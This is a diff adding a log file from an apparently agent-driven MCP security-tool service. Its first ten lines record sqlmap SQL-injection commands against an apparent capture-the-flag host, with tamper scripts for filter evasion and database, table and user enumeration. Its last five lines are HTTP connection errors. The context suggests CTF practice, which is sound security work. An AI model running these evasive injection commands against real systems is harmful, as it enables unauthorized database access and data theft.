@@ -1,0 +1,15 @@
+2026-04-13 16:22:08,630 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:21210/login.php --batch --random-agent --level 1 --risk 1 --data=username=admin&password=admin --level=2 --risk=2 --batch --forms --dbs
+2026-04-13 16:23:57,546 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:21210/view.php?no=1 --batch --random-agent --level 3 --risk 2 --dbms mysql --batch --random-agent --dbs
+2026-04-13 16:24:47,247 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:21210/view.php?no=1 --batch --random-agent --tamper space2comment --level 3 --risk 2 --dbms mysql --batch --random-agent --no-cast --hex -D --tables
+2026-04-13 16:26:35,066 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:21210/view.php?no=1 --batch --random-agent --tamper space2comment --level 3 --risk 2 --dbms mysql --batch --random-agent --hex
+2026-04-13 16:27:28,709 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:21210/view.php?no=1 --batch --random-agent --tamper space2comment --level 3 --risk 2 --dbms mysql --batch --random-agent --dbs
+2026-04-13 16:27:32,704 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:21210/view.php?no=1 --batch --random-agent --tamper space2comment --level 3 --risk 2 --dbms mysql --batch --random-agent --current-db --current-user
+2026-04-13 16:28:13,220 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -r /tmp/login_raw_req.txt --batch --random-agent --level 2 --risk 2
+2026-04-13 16:29:05,129 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -r /tmp/login_raw_req.txt --batch --random-agent --level 2 --risk 2 --batch --random-agent
+2026-04-13 16:30:51,826 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -u http://node4.anna.nssctf.cn:21210/view.php?no=1 --batch --random-agent --tamper space2comment --level 3 --risk 2 --dbms mysql --batch --random-agent --hex --dbs
+2026-04-13 16:31:56,950 - jaster.mcp.mcp_service - INFO - Executing sqlmap command: sqlmap -r /tmp/login_raw_req.txt --batch --random-agent --tamper space2comment,randomcase --level 5 --risk 3 --batch --random-agent
+2026-04-13 17:07:27,532 - jaster.mcp.mcp_service - ERROR - HTTP连接错误: http://example.com - [Errno -3] Temporary failure in name resolution
+2026-04-13 17:07:27,533 - jaster.mcp.mcp_service - ERROR - HTTP连接错误: https://httpbin.org/get - [Errno -3] Temporary failure in name resolution
+2026-04-13 17:07:44,213 - jaster.mcp.mcp_service - ERROR - HTTP连接错误: http://93.184.216.34 - All connection attempts failed
+2026-04-13 17:08:56,111 - jaster.mcp.mcp_service - ERROR - HTTP连接错误: http://127.0.0.1:8765 - All connection attempts failed
+2026-04-13 17:09:42,466 - jaster.mcp.mcp_service - ERROR - HTTP请求超时: https://httpbin.org/delay/3 - 
